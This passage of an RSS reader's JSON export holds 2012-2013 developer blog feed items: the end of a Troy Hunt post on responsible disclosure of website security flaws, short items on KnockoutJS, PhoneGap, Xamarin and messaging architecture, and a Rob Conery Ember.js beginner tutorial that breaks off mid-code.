guys, it’s simply not fair. Dumping passwords alongside email addresses or usernames, for example, is going to hurt this group. Yes, they shouldn’t haven’t reused their credentials on their email account but they did and now their mail is pwned. That’s a completely irresponsible action on behalf of those who disclosed the info and it’s going to seriously impact ordinary, everyday people.</p><p>On the other hand, disclosing XSS or TLS flaws doesn’t pose an immediate threat to consumers, an attacker still needs to go out and weaponise the risk. This might involve the attacker constructing phishing scams or organising themselves to the extent that they can actually go and sniff packets from at-risk users. Of course this happens, but it takes some effort, at least enough effort so that the site owner can fix or disable the feature in advance.</p><p>On the other hand, risks that impact only the site owner are, in my humble opinion, fairer game. The site owner is ultimately accountable for the security position of their asset and it makes not one iota of difference that the development was outsourced or that they rushed the site or that the devs just simply didn’t understand security. When the impact of disclosure is constrained to those who are ultimately accountable for the asset, whether that impact be someone else exploiting the risk or simply getting some bad press, they’ve only got themselves to blame.</p><h4>3. What is the likelihood of the risk being fixed?</h4><p>There are many instances on this blog where I’ve written about poor security. There are many instances<em>not</em>on this blog where I’ve privately written to website owners about poor security. Overwhelmingly, risks I’ve disclosed publicly have been taken seriously and equally overwhelming, risks I’ve disclosed privately haven’t been. There are exceptions, but there is no arguing the pattern and it’s exemplified by the Westfield and Black and Decker examples I opened with.</p><p>When a risk is disclosed publicly, the website owner is on notice. There is no arguing the increased visibility public disclosure creates and there is also no arguing that it expedites the remediation process on behalf of the site owner. Partly this is due to the increased likelihood of the risk being exploited and partly it’s because in the face of public naming and shaming, the site owner is somewhat compelled to respond.</p><p>The other thing that tends to happen when a risk is made public is that the one lone voice that was the discloser suddenly becomes a chorus of like-minded individuals. For example,<a href=\"https://twitter.com/UKTesco/status/229542141012107265\">this tweet</a>has now been RT’d over 2,100 times and as you’ll see from the responses, generated an awful lot of noise about the woeful state of Tesco’s security. You can’t ignore that sort of pressure (certainly<a href=\"http://www.itpro.co.uk/642391/ico-to-investigate-tesco-over-website-security-concerns\">the ICO didn’t</a>) and without doubt it increases the pressure on an organisation to address their security.</p><h4>Moving forward</h4><p>I hope this gives some insight into my personal view of disclosure, I wouldn’t have approached Black and Decker any differently (it doesn’t satisfy rule 2 on victim impact) and likewise I wouldn’t have approached Westfield any differently (the results speak for themselves). Sometimes<a href=\"https://twitter.com/zimzat/status/328996255537696768\">people will have views that differ</a>but frankly, if I can satisfy those measures I’ve described above then I can sleep at night with confidence that on balance, security on the web has benefited.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/fhxbf8LPLU8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1145}}
{"k":"0000000084","o":"0000002845","v":"001"}
{"_id":1146,"_uid":1146,"_dt":1373742620942,"_s":"0c1b47c58891de2ed4bd06f56f95fe13"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/mkcrjatygrY/pair-coding-with-knockoutjs","title":"Pair Coding With KnockoutJS","published":{"$wrap":"$date","v":1361458800000,"h":"2013-02-21T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>I was lucky enough to get some help from Ryan Niemeyer (KnockoutJS core contributor) recently, and, like I do, I asked if I could record it. I love stuff like this: I need this to work well for the Real World, and I want to do it right.</p><p><img src='http://wekeroad.com/images/knockout_refactor_slide.png'/></p><p><h2>An Expert at Work</h2><p>Most of us can figure out what we're trying to do with a new toolset - it's all about reading the docs and playing around until the philosophy of the thing creeps its way in and the tool begins to fit our hand just a bit better.</p><p>Every now and again, though, you're reminded just how much you don't know. That was the case when I asked<a href=\"http://www.knockmeout.net/\">Ryan Niemeyer</a>to take a look at the<a href=\"http://github.com/tekpub/knockout-cart\">Knockout Cart</a>that I open sourced from Tekpub's codebase. I was proud of that thing but I also knew it needed a little help.</p><p>As with so many things - I was in a hurry, it worked, I felt like it was a decent initial release, etc. Anyway, Ryan joined me and from that we have our latest video on Tekpub:</p><iframe src=\"http://player.vimeo.com/video/60131454\" width=\"650\" height=\"362\" frameborder=\"0\" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe><p>This one is wall-to-wall coding, and Ryan doesn't miss a trick. Great stuff, and I was happy to be a part of it!<a href=\"http://tekpub.com/products/knockout_refactor\">You can watch the whole thing up at Tekpub</a></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=mkcrjatygrY:IzeUTyGpoS8:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=mkcrjatygrY:IzeUTyGpoS8:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=mkcrjatygrY:IzeUTyGpoS8:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/mkcrjatygrY\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1146}}
{"k":"0000000084","o":"0000000740","v":"001"}
{"_id":1147,"_uid":1147,"_dt":1373742620942,"_s":"dfeba5b329786ec027c321bb62d6ddc1"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/SyKnPlPlJQ8/default.aspx","title":"PhoneGap/Cordova - Is HTML a reasonable app solution? With Steve Sanderson","published":{"$wrap":"$date","v":1365134400000,"h":"2013-04-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Steve Sanderson schools Scott on PhoneGap/Cordova. We explore the concepts and ask: is HTML a reasonable app solution? What kinds of apps lend themselves to HTML and JavaScript? What backend services are needed to support these apps?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/SyKnPlPlJQ8\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1147}}
{"k":"0000000084","o":"0000000658","v":"001"}
{"_id":1148,"_uid":1148,"_dt":1373742620942,"_s":"4ff3df88c1234358b2a0da9b1e0b05a3"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/wWeC7yq6ZZI/default.aspx","title":"iOS and Android apps with Xamarin Studio 2.0 and Miguel de Icaza","published":{"$wrap":"$date","v":1363320000000,"h":"2013-03-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Miguel de Icaza talks to Scott about Xamarin Studio 2.0 and how we can start making iOS and Android apps alongside Windows Phone and Windows apps today using C#!<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/wWeC7yq6ZZI\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1148}}
{"k":"0000000084","o":"0000000849","v":"001"}
{"_id":1149,"_uid":1149,"_dt":1373742620943,"_s":"7277cf97cd62f250dfd1fb519c5ffd1e"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/articles/dipInTheWild.html","title":"Expansion to DIP in the Wild","published":{"$wrap":"$date","v":1369140600000,"h":"2013-05-21T12:50:00.000Z"},"starred":false,"read":false,"content":"<div class = 'img'><img src = 'http://martinfowler.com/articles/DipInTheWild/images/BrettSchuchert.jpg' width = '75' height = '' alt = '' title = ''/></div><p><a href='http://schuchert.wikispaces.com/'>Brett’s</a>article on the Dependency Inversion Principle (DIP) and how it works in practice has been a popular read on this site (over 24,000 views since it was published at the beginning of the month). Brett has now expanded the article with two more examples from his delivery experience: questioning requirements and handling time.</p>","author":false,"_id":{"$wrap":"$oid","v":1149}}
{"k":"0000000084","o":"0000002153","v":"001"}
{"_id":1150,"_uid":1150,"_dt":1373742620943,"_s":"398faae3872e568ec122265ce8f6e0a2"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/per6ASsvwpE/","title":"Course feedback from Canada","published":{"$wrap":"$date","v":1346935034000,"h":"2012-09-06T12:37:14.000Z"},"starred":false,"read":false,"content":"<p>I just love getting emails from people who’ve attended my <a href=\"http://www.udidahan.com/training/\">course</a> and are now in a place where they’ve been able to apply what they’ve learned. Sean from Canada sent me this:</p><blockquote><p>“It’s the first project I’ve been able to use the principles from your course and the resulting codebase is so simple. I was able to add reporting module without changing a line of existing code just by subscribing to events. Awesome. Keeping everything explicit is the best was to keep it simple which i find is easier developing for mobile.  I’m sure there is lots I could improve.  I’d like to take course again one day.”</p></blockquote><p>This right here is what I use as an answer when people ask me, “don’t you get tired of giving the same course over and over again?”</p><p>Quite simply – I don’t. There’s really nothing quite like having this kind of impact on people.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=per6ASsvwpE:F7_r64YujNs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=per6ASsvwpE:F7_r64YujNs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=per6ASsvwpE:F7_r64YujNs:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=per6ASsvwpE:F7_r64YujNs:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=per6ASsvwpE:F7_r64YujNs:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/per6ASsvwpE\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1150}}
{"k":"0000000084","o":"0000002560","v":"001"}
{"_id":1151,"_uid":1151,"_dt":1373742620943,"_s":"7120180791dddb7101a2039d2ec34410"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/mOT9vU1oehw/","title":"Dennis does High Availability, the full story","published":{"$wrap":"$date","v":1348128757000,"h":"2012-09-20T08:12:37.000Z"},"starred":false,"read":false,"content":"<p>It looks like <a href=\"http://www.udidahan.com/2012/09/03/high-availability-a-la-dennis/\">my previous post</a> worked – Dennis put up a nice meaty blog post about his experiences applying the principles of <a href=\"http://www.udidahan.com/training/\">my course</a> to a tightly-coupled legacy code base.</p><p>Here’s the punchline:</p><blockquote><p>“By using messaging, queues, and publish/subscribe patterns, we were able to upgrade a core part of our system without touching any other parts – even those that it communicates with on an ongoing basis. During the short period of time that it was down, the queues took care of buffering the communication for that service without affecting anything else. The system as a whole was never really down.</p><p>This was a totally new experience for our company – an upgrade without downtime, even with the thousands of websites we’re running.”</p></blockquote><p><a href=\"http://bloggingabout.net/blogs/dennis/archive/2012/09/19/high-availability.aspx\">Read the full story</a>.</p><p>By the way, if your in the Netherlands next week, you can catch Dennis speaking about these topics at the Dutch .NET User Group. You can get all the info and register <a href=\"http://www.dotned.nl/register/48/distributed-systems-design-bij-macaw-door-dennis-van-der-stelt.aspx\">here</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=mOT9vU1oehw:-C0Jt8TuZIk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=mOT9vU1oehw:-C0Jt8TuZIk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=mOT9vU1oehw:-C0Jt8TuZIk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=mOT9vU1oehw:-C0Jt8TuZIk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=mOT9vU1oehw:-C0Jt8TuZIk:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/mOT9vU1oehw\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1151}}
{"k":"0000000084","o":"0000026003","v":"001"}
{"_id":1152,"_uid":1152,"_dt":1373742620944,"_s":"5d783f796100a84a8a5c9f9961d40d73"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/yMrhlO3kWpI/ember-baby-steps","title":"Ember: Baby Steps","published":{"$wrap":"$date","v":1363791600000,"h":"2013-03-20T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>If you read my blog, you know I've been goofing around with quite a few Javascript libraries. Some are easier than others. This time, it's Ember's turn.</p><p><img src='http://wekeroad.com/images/ember_get_started.png'/></p><p><h2>A Bit Steep</h2><p>I figured it's about time to get constructive in terms of getting to know EmberJS. The only reason I haven't up until this point is that I've been very busy with<a href=\"http://tekpub.com/productions/angular\">Tekpub's Angular production</a>.</p><p>So, today's the day. Let's get started.</p><h2>Baby Steps</h2><p>Getting Ember setup is frustrating.<a href=\"http://emberjs.com/guides/\">The Ember guides</a>are focused heavily on concept, not utility. For instance - getting Ember to load (for the uninitiated) is a matter of refreshing until the errors go away. I'll save you that time :).</p><p>Kick open a console (if you're on Linux/Mac) or crack open VS/WebMatrix if you're on a Windows machine. We want a bare application here so let's start by creating a directory:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span></pre></td><td class='code'><pre><code class=''><span class='line'>mkdir hello-ember</span><span class='line'>cd hello-ember</span></code></pre></td></tr></table></div></figure><p>Now we're in our directory. Let's create the pages/directories we'll need:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span></pre></td><td class='code'><pre><code class=''><span class='line'>mkdir js</span><span class='line'>touch index.html</span></code></pre></td></tr></table></div></figure><p>The next step is to get the scripts we'll need. We'll need 3:</p><ul><li>jQuery</li><li>Handlebars</li><li>Ember</li></ul><p>Ember won't work unless you have all three of these. I like to use the jQuery CDN at Google, but you'll need to<a href=\"https://raw.github.com/emberjs/ember.js/release-builds/ember-1.0.0-rc.1.js\">download Ember directly</a>and also<a href=\"https://raw.github.com/wycats/handlebars.js/1.0.0-rc.3/dist/handlebars.js\">Handlebars</a>. Put these files in your<code>js</code>directory.</p><p>Be sure to use the unminified version for development. This goes for any library you're learning - the unminified versions are easy to traverse if you have a debugger, and they typically have helpful debug statements built in.</p><p>Save these files in your<code>js</code>directory.</p><p>Let's add one more file where our application code will go:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class=''><span class='line'>touch js/app.js</span></code></pre></td></tr></table></div></figure><p>Open up the index.html page and stub out our skeleton, with the script references in place:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"cp\">&lt;!DOCTYPE html&gt;</span></span><span class='line'><span class=\"nt\">&lt;html</span><span class=\"na\">lang=</span><span class=\"s\">\"en\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;head&gt;</span></span><span class='line'><span class=\"nt\">&lt;title&gt;</span>Hello Ember<span class=\"nt\">&lt;/title&gt;</span></span><span class='line'><span class=\"nt\">&lt;/head&gt;</span></span><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>Hello Ember<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">src=</span><span class=\"s\">\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/handlebars.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/ember.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/app.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/html&gt;</span></span></code></pre></td></tr></table></div></figure><p>Let's run this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='html'><span class='line'>python -m SimpleHTTPServer</span></code></pre></td></tr></table></div></figure><p>Things should be cycling<a href=\"http://localhost:8000\">on port 8000</a>. If you're on Windows, just hit F5.</p><p>Now let's write some Ember code.</p><h2>Step 1: The Application View</h2><p>Up front: there's a lot of magic that happens behind the scenes with Ember. Just about any tutorial you read will spend 75% of the time explaining the concepts behind Ember, and 25% of the time on actually using it.</p><p>This can be daunting for people who\"want to get a feel\" (like me) and don't like sitting through conceptual lectures. I like to write code to understand a tool - so let's do that and I'll explain what I know along the way.</p><p>Open up js/app.js and create the Ember application:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span></code></pre></td></tr></table></div></figure><p>We have an application, which is a lovely start. We need at least two more things before we know that Ember is even alive and running:</p><ul><li>a View</li><li>a Controller</li></ul><p>The simplest view to create is the overall application view - let's add that to our HTML page, removing the first-level headers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>This script tag is a Handlebars template. If you don't know what that is: it's just like an ERB template in Rails (or a Razor template in ASP.NET MVC) except it works with Javascript on the client.</p><p>Handlebars is pretty simple to use, and Ember extends some of its functionality to make it work happily with the Ember bits.</p><p>We've identified this template using<code>data-template-name</code>as being the main application viewport. Let's stick something in it.</p><h2>Step 2: The Application Controller</h2><p>If you're familiar with Rails-style MVC, well... forget it. There are many flavors of MVC and we'll be working with Desktop/Smalltalk-80 style here. This confused me greatly, and I still don't know how I feel about it, but it doesn't matter. This is the way Ember works.</p><p>In short:<strong>Controllers in Ember convey data to your templates</strong>.</p><p>To see this let's create our first Controller. Open up app.js:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">ApplicationController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>If you've used Backbone before, this will look very odd. I should also mention that using the ApplicationController like this is not a good idea - I'll fix it in just a second.</p><p>Let's update the view so we can see our data:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>If you're working in Chrome, make sure the console is open by using Cmd-Shift-I (or Ctrl-Shift-I in Windows). If you see any errors here, correct them. It's likely you might have a 404 reference to one of your script files, or you've put them in your page in the wrong order (use my code above for the right order).</p><p>If everything is working: refresh your page - you should see a nice, Wonka greeting.</p><h2>Step 3: Conventions</h2><p>Look back over what we've written. Nowhere did we state\"get this template and render it this way\". Instead, Ember used the name of our template and married it up with the name of our Controller - and it all<em>just worked</em>.</p><p>This is a key bit of understanding with Ember:<strong>Naming things properly is everything</strong>.</p><p>To see this, let's get out of working with our ApplicationController directly.</p><p>First, create a new Controller, we'll call it the\"IndexController\". Don't name it something else - IndexController is what shows by default:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Now, let's update our view so that the application view doesn't have hard-coded values in it:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">outlet</span><span class=\"p\">}}</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"index\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>Refresh your page. You should see the same thing we saw before: a nice Wonka greeting. But what happened here?</p><p>Again: naming conventions at work. The ApplicationController is gone from our code, but it still exists\"behind the scenes\" as Ember created it for us. In the first example (where we worked directly with it) - you can think of that as\"overriding\" the ApplicationController.</p><p>The same goes with the IndexController. It was always there - but we didn't need it. In the second example we essentially\"overrode\" the IndexController and created a view for it.</p><p>The rendered view was then injected into the application view where<code>{{outlet}}</code>sits on the page. You can think of<code>{{outlet}}</code>in the same way that<code>yield</code>is used in Rails.</p><h2>Step 4: Models and Routing</h2><p>We've done some basic stuff here, let's explore the other parts of Ember. Once again, I'll keep it<strong>extremely simple</strong>.</p><p>In app.js, let's define a model. I'll do this by extending an Ember Object:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p><strong>Update</strong>- this code has been changed based on feedback from Tom Dale and comments below.</p><p>Now, let's define a Route. Routes in Ember help to link models to Controllers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span 